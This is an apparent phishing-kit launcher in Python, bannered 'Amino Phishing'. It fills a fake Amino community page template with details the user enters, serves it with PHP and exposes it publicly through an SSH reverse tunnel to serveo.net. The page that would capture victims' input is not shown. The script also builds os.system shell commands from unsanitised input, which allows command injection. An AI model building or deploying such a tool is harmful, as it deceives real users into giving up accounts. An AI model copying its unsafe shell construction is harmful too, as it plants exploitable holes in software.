# Creado por Fede <3

import os
from colorama import init, Fore

def main():

    print(Fore.LIGHTGREEN_EX+"   / \   _ __ ___ (_)_ __   ___   |  _ \| |__ (_)___| |__ (_)_ __   __ _ ")
    print("  / _ \ | '_ ` _ \| | '_ \ / _ \  | |_) | '_ \| / __| '_ \| | '_ \ / _` |")
    print(" / ___ \| | | | | | | | | | (_) | |  __/| | | | \__ \ | | | | | | | (_| |")
    print("/_/   \_\_| |_| |_|_|_| |_|\___/  |_|   |_| |_|_|___/_| |_|_|_| |_|\__, |")
    print("                                                                   |___/ "+Fore.LIGHTYELLOW_EX)

    print(Fore.LIGHTBLUE_EX+"Creado por Fede >> World Hacking <<\n"+Fore.LIGHTYELLOW_EX)


    htmlLec = open("original-index/index.html","r")
    htmlLectura = htmlLec.readlines()
    cssLec = open("original-index/styles.css","r")
    cssLectura = cssLec.readlines()

    os.chdir("images")
    if len(os.listdir()) == 0:
        print(Fore.LIGHTRED_EX+"[!] No se han encontrado imagenes en la carpeta 'images' \n"+Fore.LIGHTYELLOW_EX)
    os.chdir("..")

    os.chdir("src/img/")
    for files in os.listdir():
        os.system("rm "+files)

    os.chdir("../../")

    titulo = input("Titulo: ")
    miembros = input("Miembros: ")
    idioma = input("Idioma: ")
    _id = input("ID: ")
    short_description = input("Descripcion Corta: ")

    opc = input("Desea usar un archivo para la descripcion larga? (y/N) ").lower()
    if opc == "y":
        descripcion_larga = input("Archivo Descripcion Larga: ")
        descripcion_larga = open(descripcion_larga, "r")
    else:
        descripcion_larga = input("Descripcion Larga: ")


    imagen_portada = input("Imagen Portada: ")
    if imagen_portada != "":
        os.system("cp images/"+imagen_portada+" src/img/")
    imagen_fondo = input("Imagen Fondo: ")
    if imagen_fondo != "":
        os.system("cp images/"+imagen_fondo+" src/img/")

    htmlLectura[28] = titulo
    htmlLectura[36] = miembros + " Miembros"
    htmlLectura[41] = idioma
    htmlLectura[49] = _id
    htmlLectura[54] = short_description
    if opc == "y":
        htmlLectura[78] = descripcion_larga.read()
    else:
        htmlLectura[78] = descripcion_larga
    htmlLectura[24] = "img/"+imagen_portada
    cssLectura[6] = 'background-image: url("../img/'+imagen_fondo+'");\n' 


    htmlWrite = open("src/index.html","w")
    cssWrite = open("src/css/styles.css","w")

    for css in cssLectura:
        cssWrite.write(css)
    for html in htmlLectura:
        htmlWrite.write(html)

    htmlLec.close()
    htmlWrite.close()
    cssWrite.close()
    cssLec.close()

    url = input("Nombre de la url: ")
    
    opc = input("Ejecutar Servidor? (y/N) ").lower()
    if opc == "y":
        os.system("cd src;php -S localhost:4546 >/dev/null 2>&1 &")
        os.system(f"ssh -R {url}:80:localhost:4546 serveo.net")
    
        os.system("pkill php")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(Fore.LIGHTRED_EX+"\nAdios")
        os.system("pkill php")